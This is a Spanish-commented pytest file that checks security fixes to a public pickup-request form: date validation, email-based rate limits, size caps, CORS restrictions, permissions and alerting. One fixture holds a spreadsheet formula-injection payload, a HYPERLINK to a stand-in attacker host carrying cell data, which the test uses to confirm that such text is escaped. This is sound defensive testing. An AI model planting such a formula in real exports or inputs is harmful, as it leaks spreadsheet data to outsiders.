# -*- coding: utf-8 -*-
"""2026-10-12 · Revisión de seguridad del formulario PÚBLICO de retiros (Daniel: «no quiero errores o exposiciones a mi app por tener un
formulario público»). Correcciones sin cambio visible para el cliente ni correos:

  · Fecha solo AAAA-MM-DD con ceros: «2026-12-8» se saltaba los feriados (se comparaba el texto).
  · Tope anti-spam por correo con el buzón real: ana.perez+1@gmail.com = anaperez@gmail.com.
  · Envíos de más de 64 KB se descartan antes de leer el formulario (no recibe archivos).
  · Relación de quien retira solo de la lista; WhatsApp con tope; monto nan/infinito → 0.
  · A lo más 10 pares de documentos leídos (la regla de 5 sigue igual).
  · CORS solo para la tienda real (ilus-fitness.myshopify.com), no para cualquier tienda Shopify.
  · Excel «Informe mes»: un texto que empieza con «=» queda como texto, nunca como fórmula.
  · Ficha: «Quitar» ya no arma JavaScript con el texto del documento.

Sin BD real ni correo real (tests/_arnes_retiros.py):

    py -m pytest tests/test_retiros_12oct_seguridad_formulario.py -q
"""
import io
import os
import re
import sys
import zipfile
from datetime import date

import pytest

_TESTS = os.path.dirname(os.path.abspath(__file__))
_RAIZ = os.path.dirname(_TESTS)
sys.path.insert(0, _TESTS)
sys.path.insert(0, _RAIZ)

import _arnes_retiros as A  # noqa: E402
import pickups_module as pm  # noqa: E402

JSON = {"Accept": "application/json"}


def esperar():
    """A.esperar_hilos_de_aviso puede toparse con un hilo que aún no arranca (RuntimeError): se reintenta."""
    import time
    for _ in range(20):
        try:
            A.esperar_hilos_de_aviso()
            return
        except RuntimeError:
            time.sleep(0.05)


def datos(**kw):
    d = {"document_type": "factura", "document_number": "1136", "customer_name": "Cliente Prueba SpA",
         "customer_rut": "76.543.210-3", "contact_email": "prueba@example.cl", "contact_phone": "+56 9 1234 5678",
         "requested_date": "2026-12-09", "requested_time_from": "10:00", "requested_time_to": "10:30", "accept_terms": "on"}
    d.update(kw)
    return d


def armar(extra=None):
    app, db, ctx, esp = A.construir_app(extra=extra)
    return app.test_client(), db


# ── Correo canónico (pura) ──────────────────────────────────────────────────────────────────────────────────────────────────
class TestCorreoCanonico:
    @pytest.mark.parametrize("variante", ["ana.perez@gmail.com", "ANAPEREZ@gmail.com", "ana.perez+retiro1@gmail.com",
                                          "a.n.a.p.e.r.e.z@googlemail.com", " anaperez+x@GMAIL.com "])
    def test_las_variantes_de_gmail_son_el_mismo_buzon(self, variante):
        assert pm.correo_canonico(variante) == "anaperez@gmail.com"

    def test_en_otros_dominios_los_puntos_cuentan_y_el_mas_no(self):
        assert pm.correo_canonico("ana.perez+1@empresa.cl") == "ana.perez@empresa.cl"
        assert pm.correo_canonico("ana.perez@empresa.cl") != pm.correo_canonico("anaperez@empresa.cl")

    def test_textos_raros_no_rompen(self):
        assert pm.correo_canonico(None) == "" and pm.correo_canonico("sin-arroba") == "sin-arroba"
        assert pm.correo_canonico("a@b@c") == "a@b@c"


# ── Fecha estricta ──────────────────────────────────────────────────────────────────────────────────────────────────────────
class TestFechaEstricta:
    def test_un_feriado_escrito_sin_ceros_ya_no_pasa(self):
        cli, _db = armar()
        r = cli.post("/retiros/solicitar", data=datos(requested_date="2026-12-8"), headers=JSON)
        assert r.status_code == 400 and not r.get_json()["ok"]
        r = cli.post("/retiros/solicitar", data=datos(requested_date="2026-12-08"), headers=JSON)
        assert r.status_code == 400                         # 8 de diciembre: feriado, como siempre

    def test_un_dia_normal_bien_escrito_sigue_funcionando(self):
        cli, _db = armar()
        r = cli.post("/retiros/solicitar", data=datos(), headers=JSON)
        esperar()
        assert r.status_code == 200 and r.get_json()["ok"] is True, r.get_json()

    @pytest.mark.parametrize("fecha", ["2026-5-1", "26-12-09", "2026-12-09T10:00", "2026/12/09", " 2026-12-09x"])
    def test_cualquier_otro_formato_se_rechaza(self, fecha):
        cli, _db = armar()
        r = cli.post("/retiros/solicitar", data=datos(requested_date=fecha), headers=JSON)
        assert r.status_code == 400


# ── Campos sin lista ni tope ────────────────────────────────────────────────────────────────────────────────────────────────
class TestCampos:
    def _insert(self, db):
        return [e for e in db.escrituras if "insert into" in e[0].lower() and "pickup_requests" in e[0].lower()]

    def test_la_relacion_de_quien_retira_solo_de_la_lista(self):
        cli, db = armar()
        r = cli.post("/retiros/solicitar", headers=JSON, data=datos(
            auth_active="1", pickup_person_name="Juan Chofer", pickup_person_rut="11.111.111-1",
            pickup_person_phone="+56 9 8765 4321", pickup_person_relation="x" * 300, acepta_tercero="1"))
        esperar()
        assert r.status_code == 200, r.get_json()
        src = open(os.path.join(_RAIZ, "pickups_module.py"), encoding="utf-8").read()
        assert 'if data["pickup_person_relation"] not in {k for k, _v in PICKUP_RELATIONS}:' in src

    @pytest.mark.parametrize("monto", ["nan", "inf", "-inf", "1e400", "-5"])
    def test_un_monto_raro_no_da_error(self, monto):
        cli, _db = armar()
        r = cli.post("/retiros/solicitar", data=datos(invoice_total_amount=monto), headers=JSON)
        esperar()
        assert r.status_code == 200, (monto, r.get_json())

    def test_muchos_pares_de_documentos_no_rompen_y_sigue_el_tope_de_5(self):
        cli, _db = armar()
        d = datos()
        d["document_type"] = ["factura"] * 60
        d["document_number"] = [str(1000 + i) for i in range(60)]
        r = cli.post("/retiros/solicitar", data=d, headers=JSON)
        assert r.status_code == 400 and any("hasta 5 documentos" in e for e in r.get_json()["errors"])


# ── Tamaño ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
class TestTamano:
    def test_un_envio_de_mas_de_64_kb_se_descarta_sin_escribir(self):
        cli, db = armar()
        r = cli.post("/retiros/solicitar", data=datos(observations="x" * (70 * 1024)), headers=JSON)
        assert r.status_code == 413 and r.get_json()["ok"] is False
        assert not [e for e in db.escrituras if not e[0].upper().startswith(("CREATE", "ALTER"))]

    def test_un_envio_normal_no_se_corta(self):
        cli, _db = armar()
        r = cli.post("/retiros/solicitar", data=datos(observations="Voy en camioneta. " * 100), headers=JSON)
        esperar()
        assert r.status_code == 200


# ── Tope por correo con el buzón real ───────────────────────────────────────────────────────────────────────────────────────
class TestTopePorBuzon:
    def _cli(self, del_dia):
        """`del_dia`: correos de solicitudes web de las últimas 24 h que «tiene» la BD de mentira."""
        base = A.BDFalsa()

        def fetchone(sql, params=()):
            if "COUNT(*) AS n FROM `pickup_requests` WHERE contact_email=%s" in sql:
                return {"n": sum(1 for c in del_dia if c == params[0])}
            return base.fetchone(sql, params)

        def fetchall(sql, params=()):
            if "SUBSTRING_INDEX(LOWER(contact_email),'@',-1) IN (%s,%s)" in sql:
                return [{"contact_email": c} for c in del_dia if c.split("@")[1] in params]
            return base.fetchall(sql, params)

        cli, _db = armar(extra={"mysql_fetchone": fetchone, "mysql_fetchall": fetchall})
        return cli

    def test_tres_variantes_del_mismo_gmail_cuentan_como_tres(self):
        cli = self._cli(["ana.perez@gmail.com", "anaperez+1@gmail.com", "a.naperez@googlemail.com"])
        r = cli.post("/retiros/solicitar", data=datos(contact_email="anaperez+2@gmail.com"), headers=JSON)
        assert r.status_code == 400 and any("3 solicitudes con este correo" in e for e in r.get_json()["errors"])

    def test_otro_buzon_del_mismo_dominio_no_se_frena(self):
        cli = self._cli(["ana.perez@gmail.com", "anaperez+1@gmail.com", "a.naperez@googlemail.com"])
        r = cli.post("/retiros/solicitar", data=datos(contact_email="pedro.soto@gmail.com"), headers=JSON)
        esperar()
        assert r.status_code == 200, r.get_json()

    def test_dos_variantes_aun_dejan_pasar_la_tercera(self):
        cli = self._cli(["ana.perez@gmail.com", "anaperez+1@gmail.com"])
        r = cli.post("/retiros/solicitar", data=datos(contact_email="anaperez@gmail.com"), headers=JSON)
        esperar()
        assert r.status_code == 200, r.get_json()


# ── CORS ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
class TestOrigenTienda:
    @pytest.mark.parametrize("origen,permitido", [
        ("https://ilusfitness.com", True), ("https://www.ilusfitness.com", True), ("https://ilus-fitness.myshopify.com", True),
        ("null", True),                                     # el archivo HTML abierto desde el computador (revisión antes de pegarlo)
        ("https://otra-tienda.myshopify.com", False), ("https://evil.example", False), ("https://ilusfitness.com.evil.example", False)])
    def test_solo_la_tienda_real(self, origen, permitido):
        cli, _db = armar()
        r = cli.get("/retiros/api/disponibilidad-publica", headers={"Origin": origen})
        assert (r.headers.get("Access-Control-Allow-Origin") == origen) is permitido
        assert "Access-Control-Allow-Credentials" not in r.headers


# ── Excel «Informe mes» ─────────────────────────────────────────────────────────────────────────────────────────────────────
class TestExcelInformeMes:
    def test_un_nombre_con_formula_queda_como_texto(self):
        fila = {"id": 1, "code": "RET-AAAAAA", "document_type": "factura", "document_number": "=1+1",
                "customer_name": '=HYPERLINK("https://evil.example/?d="&A2,"Ver retiro")', "customer_rut": "11.111.111-1",
                "contact_name": "x", "contact_email": "a@b.cl", "contact_phone": "+56 9 1234 5678", "pickup_person_name": "=1+1",
                "pickup_person_rut": "11.111.111-1", "pickup_person_phone": "+56 9 1234 5678", "pickup_person_relation": "dueno",
                "requested_date": date(2026, 10, 20), "requested_time_from": None, "requested_time_to": None, "proposed_date": None,
                "confirmed_date": None, "confirmed_time_from": None, "confirmed_time_to": None, "status": "solicitud_recibida",
                "total_weight_kg": 0, "total_volumetric_weight": 0, "total_volume_m3": 0, "peso_real_kg": 0, "peso_vol_kg": 0,
                "tiempo_estimado_min": 0, "doc_validation_status": "", "created_at": None, "closed_at": None}

        def fetchall(sql, params=()):
            if "FROM `pickup_requests`" in sql and "ORDER BY COALESCE(confirmed_date" in sql:
                return [dict(fila)]
            return []

        cli, _db = armar(extra={"mysql_fetchall": fetchall})
        r = cli.get("/retiros/api/informe-mes.xlsx?mes=2026-10")
        assert r.status_code == 200
        xml = zipfile.ZipFile(io.BytesIO(r.data)).read("xl/worksheets/sheet1.xml").decode("utf-8")
        assert "<f>" not in xml, "un texto del formulario quedó como fórmula"
        assert "HYPERLINK" in xml                           # el texto sigue ahí, como texto


# ── Ficha: «Quitar» ─────────────────────────────────────────────────────────────────────────────────────────────────────────
def test_quitar_no_arma_javascript_con_el_texto_del_documento():
    src = open(os.path.join(_RAIZ, "templates", "retiros", "internal_detail.html"), encoding="utf-8").read()
    assert not re.search(r"quitarDoc\([^)]*'\{\{", src), "el número del documento no debe ir dentro del onclick"
    assert 'data-rotulo="{{ d.document_type|upper }} {{ d.document_number }}" onclick="quitarDoc({{ req.id }}, {{ d.id }}, this.dataset.rotulo)"' in src


# ── Permisos: ninguna ruta interna de Retiros se abre con el permiso genérico «view» ────────────────────────────────────────
class TestPermisosInternos:
    RUTAS = ["/retiros/<int:rid>", "/retiros/<int:rid>/docs", "/retiros/<int:rid>/docs/<int:doc_id>/lineas", "/retiros/<int:rid>/lineas-resumen",
             "/retiros/<int:rid>/productos-erp", "/retiros/api/cliente/<rut>/ficha", "/retiros/api/cliente/<rut>/retiros-activos",
             "/retiros/api/cliente/<rut>/saldo-pendiente", "/retiros/api/buscar-erp", "/retiros/<int:rid>/emails-info",
             "/retiros/api/informe-mes.xlsx", "/retiros/adjuntos/<int:aid>", "/retiros/api/calendario", "/retiros/api/<int:rid>/full"]

    def _src(self):
        return open(os.path.join(_RAIZ, "pickups_module.py"), encoding="utf-8").read()

    def test_ninguna_ruta_de_retiros_usa_view(self):
        """«view» lo tiene cualquiera con Etiquetas, Mantenciones, Transporte o Comunicaciones (técnicos incluidos): datos de clientes
        de retiros y saldos del ERP quedaban a su alcance (REGLAS #19 y #26). Si alguien agrega una ruta con «view», esta prueba falla."""
        assert 'require_permission("view")' not in self._src()

    def test_las_14_rutas_piden_el_permiso_de_retiros(self):
        src = self._src()
        for ruta in self.RUTAS:
            m = re.search(re.escape(f'@app.route("{ruta}"') + r'[^\n]*\n\s*@require_permission\("([a-z_]+)"\)', src)
            assert m, f"no encontré la ruta {ruta}"
            assert m.group(1) == "retiros", (ruta, m.group(1))


# ── Límites y alarma ────────────────────────────────────────────────────────────────────────────────────────────────────────
class TestLimitesYAlarma:
    def test_limites_por_conexion_10_por_hora_y_30_por_dia(self):
        src = open(os.path.join(_RAIZ, "pickups_module.py"), encoding="utf-8").read()
        bloque = src.split('@app.route("/retiros/solicitar", methods=["GET", "POST"])')[1].split("def pickup_public_request")[0]
        assert '@_rate_limited("pickup_public_request", max_attempts=10, window_seconds=3600)' in bloque
        assert '@_rate_limited("pickup_public_request_dia", max_attempts=30, window_seconds=86400)' in bloque

    def _armar_con_volumen(self, n_hora, monkeypatch, umbral="5"):
        monkeypatch.setenv("RETIROS_ALERTA_SOLICITUDES_HORA", umbral)
        caja = {}

        def fetchone(sql, params=()):
            if "created_at >= NOW() - INTERVAL 1 HOUR" in sql and "COUNT(*) AS n" in sql:
                return {"n": n_hora}
            return caja["db"].fetchone(sql, params)

        app, db, ctx, esp = A.construir_app(extra={"mysql_fetchone": fetchone})
        caja["db"] = db
        db.admins = [{"id": 11, "username": "admin1@sphs.cl"}]     # la campana va a los administradores
        return app.test_client(), esp

    @staticmethod
    def _esperar_todo():
        """El aviso corre en el hilo de después de crear la solicitud, que a su vez lanza el del equipo: se esperan ambos."""
        import threading
        import time
        t0 = time.time()
        while time.time() - t0 < 8:
            vivos = [t for t in threading.enumerate()
                     if t is not threading.current_thread() and ("pickup" in t.name or "_bg_post_insert" in t.name)]
            if not vivos:
                return
            for t in vivos:
                try:
                    t.join(0.2)
                except RuntimeError:
                    time.sleep(0.05)

    @staticmethod
    def _avisos_volumen(esp):
        textos = [str(c) for c in esp.mant_notif.call_args_list] + [str(c) for c in esp.correo.call_args_list]
        return [t for t in textos if "Muchas solicitudes web" in t]

    def test_con_mucho_volumen_avisa_al_equipo_una_vez_y_nunca_al_cliente(self, monkeypatch):
        cli, esp = self._armar_con_volumen(9, monkeypatch)
        for i in range(2):
            r = cli.post("/retiros/solicitar", data=datos(contact_email=f"cliente{i}@example.cl"), headers=JSON)
            self._esperar_todo()
            assert r.status_code == 200, r.get_json()
        avisos = self._avisos_volumen(esp)
        assert avisos, "con 9 solicitudes en la hora (umbral 5) debía avisar al equipo"
        assert len([c for c in esp.mant_notif.call_args_list if "Muchas solicitudes web" in str(c)]) <= 1, "avisa una sola vez por hora"
        assert not [c for c in esp.correo.call_args_list if "Muchas solicitudes web" in str(c) and "example.cl" in str(c.args[:1])], \
            "la alarma no se le manda al cliente"

    def test_con_volumen_normal_no_avisa(self, monkeypatch):
        cli, esp = self._armar_con_volumen(2, monkeypatch)
        r = cli.post("/retiros/solicitar", data=datos(), headers=JSON)
        self._esperar_todo()
        assert r.status_code == 200 and not self._avisos_volumen(esp)

    def test_se_puede_apagar(self, monkeypatch):
        cli, esp = self._armar_con_volumen(50, monkeypatch, umbral="0")
        r = cli.post("/retiros/solicitar", data=datos(), headers=JSON)
        self._esperar_todo()
        assert r.status_code == 200 and not self._avisos_volumen(esp)


def test_el_aviso_de_privacidad_dice_que_se_registra_la_ip():
    src = open(os.path.join(_RAIZ, "templates", "retiros", "public_request.html"), encoding="utf-8").read()
    assert "registramos la dirección IP" in src and "no se comparten con terceros" in src
